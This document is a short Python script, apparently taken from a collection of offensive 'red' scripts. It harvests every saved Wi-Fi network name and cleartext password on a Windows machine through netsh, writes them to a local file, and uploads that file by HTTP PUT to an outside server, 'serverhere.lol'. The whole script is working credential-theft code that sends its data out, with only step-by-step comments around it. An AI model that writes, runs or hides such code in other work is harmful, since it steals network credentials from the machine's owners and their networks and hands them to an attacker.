#! py
# https://youtu.be/SzYKzAHsdMg
# https://github.com/davidbombal/red-python-scripts
# Import subprocess, so we can use system commands
import subprocess

# Import the re module, so we can make use of regular expressions
import re
import requests


def get_SSIDs():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

    return profile_names


def get_passwds(profile_names):
    if len(profile_names) != 0:
        wifi_list = []

        for name in profile_names:

            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()

            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile = {}

                profile_info_passwd = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()

                passwd = re.search("Key Content            : (.*)\r", profile_info_passwd)

                if passwd is None:
                    wifi_profile[name] = None
                else:
                    wifi_profile[name] = passwd[1]
                wifi_list.append(wifi_profile)

        return wifi_list


def save_networks(wifi_list):
    with open('wifi.txt', 'w+') as fh:
        for wifi_profile in wifi_list:
            for key in wifi_profile:
                fh.write(f"SSID: {key}\nPassword: {wifi_profile.get(key)}\n")


def upload_networks():
    with open('wifi.txt', 'rb') as fh:
        # Do put request with the data as the file
        r = requests.put("http://serverhere.lol/", data=fh)
        # status code should be 200 if successful
        if r.status_code == 200:
            print('Success')


if __name__ == "__main__":
    SSIDs = get_SSIDs()
    SSIDs_passwds = get_passwds(SSIDs)
    save_networks(SSIDs_passwds)
    upload_networks()
